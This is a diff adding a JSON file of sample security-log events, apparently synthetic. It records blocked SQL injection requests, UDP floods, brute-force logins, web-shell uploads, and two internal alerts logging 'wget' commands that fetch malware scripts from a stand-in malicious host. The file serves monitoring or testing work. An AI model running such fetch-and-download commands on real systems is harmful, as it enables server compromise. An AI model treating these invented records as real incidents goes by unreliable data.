@@ -1,0 +1,122 @@
+{
+  "waf_attacks": [
+    {
+      "timestamp": "2024-03-06T12:30:45Z",
+      "source_ip": "192.168.1.100",
+      "destination_ip": "203.0.113.10",
+      "request_url": "/login",
+      "http_method": "POST",
+      "status_code": 403,
+      "attack_type": "SQL Injection",
+      "rule_id": "WAF-001",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "country": "USA",
+      "blocked": true
+    },
+    {
+      "timestamp": "2024-03-06T13:30:45Z",
+      "source_ip": "192.168.1.101",
+      "destination_ip": "203.0.113.11",
+      "request_url": "/admin",
+      "http_method": "POST",
+      "status_code": 403,
+      "attack_type": "SQL Injection",
+      "rule_id": "WAF-002",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "country": "Canada",
+      "blocked": true
+    }
+  ],
+  "ddos_attacks": [
+    {
+      "timestamp": "2024-03-06T12:45:00Z",
+      "source_ip": "185.199.110.153",
+      "attack_vector": "UDP Flood",
+      "destination_ip": "203.0.113.10",
+      "destination_port": 80,
+      "packet_count": 500000,
+      "traffic_volume_mb": 250.5,
+      "duration_seconds": 120,
+      "mitigation": "Rate Limiting",
+      "blocked": true
+    },
+    {
+      "timestamp": "2024-03-06T13:00:00Z",
+      "source_ip": "185.199.110.154",
+      "attack_vector": "UDP Flood",
+      "destination_ip": "203.0.113.11",
+      "destination_port": 80,
+      "packet_count": 600000,
+      "traffic_volume_mb": 300.5,
+      "duration_seconds": 130,
+      "mitigation": "Rate Limiting",
+      "blocked": true
+    }
+  ],
+  "brute_force_attempts": [
+    {
+      "timestamp": "2024-03-06T13:00:10Z",
+      "source_ip": "102.54.98.76",
+      "username_attempted": "admin",
+      "failed_attempts": 15,
+      "login_url": "/admin/login",
+      "user_agent": "curl/7.68.0",
+      "country": "Russia",
+      "blocked": true
+    },
+    {
+      "timestamp": "2024-03-06T13:10:10Z",
+      "source_ip": "102.54.98.77",
+      "username_attempted": "root",
+      "failed_attempts": 20,
+      "login_url": "/admin/login",
+      "user_agent": "curl/7.68.0",
+      "country": "Germany",
+      "blocked": true
+    }    
+  ],
+  "malicious_file_uploads": [
+    {
+      "timestamp": "2024-03-06T14:15:30Z",
+      "source_ip": "88.77.66.55",
+      "upload_url": "/upload",
+      "file_name": "shell.php",
+      "file_size_kb": 120,
+      "content_type": "application/x-php",
+      "md5_hash": "3a6eb8d9c1d4d6a9f0e28b0c3f8b9a5d",
+      "blocked": true
+    },
+    {
+      "timestamp": "2024-03-06T14:30:30Z",
+      "source_ip": "88.77.66.56",
+      "upload_url": "/upload",  
+      "file_name": "backdoor.php",
+      "file_size_kb": 150,
+      "content_type": "application/x-php",
+      "md5_hash": "b2c8b1a9d3a6b6c9f2b4e9a3e7c8c1b1",
+      "blocked": true
+    }    
+  ],
+  "internal_system_alerts": [
+    {
+      "timestamp": "2024-03-06T15:30:00Z",
+      "server_ip": "203.0.113.50",
+      "process_name": "bash",
+      "command_executed": "wget http://malicious-site.com/malware.sh",
+      "user": "www-data",
+      "pid": 4321,
+      "alert_level": "high",
+      "action_taken": "process_killed"
+    },
+    {
+      "timestamp": "2024-03-06T16:00:00Z",
+      "server_ip": "203.0.113.51",
+      "process_name": "bash",
+      "command_executed": "wget http://malicious-site.com/malware2.sh",
+      "user": "www-data",
+      "pid": 4322,
+      "alert_level": "high",
+      "action_taken": "process_killed"
+    }
+  ]
+}
